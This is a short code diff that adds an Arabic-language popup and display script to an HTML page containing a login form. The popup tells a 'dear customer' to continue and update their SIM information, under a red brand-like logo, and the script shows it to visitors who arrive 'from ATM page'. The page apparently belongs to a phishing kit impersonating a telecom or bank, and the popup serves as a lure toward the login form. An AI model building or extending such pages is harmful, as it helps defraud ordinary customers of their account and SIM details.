@@ -296,6 +296,28 @@
     </section>
   </main>
 
+  <!-- Popup Overlay -->
+  <div id="welcomePopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#fff; border-radius:16px; padding:32px 24px; max-width:360px; width:90%; text-align:center; box-shadow:0 8px 32px rgba(0,0,0,0.2);">
+      <svg style="width:75px; height:63px; margin:0 auto 16px;" viewBox="0 0 74 62">
+        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
+        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
+      </svg>
+      <p style="font-size:17px; color:#333; line-height:1.7; margin-bottom:24px; font-weight:500;">عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك</p>
+      <button onclick="document.getElementById('welcomePopup').style.display='none'" style="width:100%; padding:14px; background:#ed1c24; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;">متابعة</button>
+    </div>
+  </div>
+
+  <script>
+    // Show popup if coming from ATM page
+    (function() {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('popup') === '1') {
+        document.getElementById('welcomePopup').style.display = 'flex';
+      }
+    })();
+  </script>
+
   <script>
     (function () {
       var form = document.querySelector('.login-form');
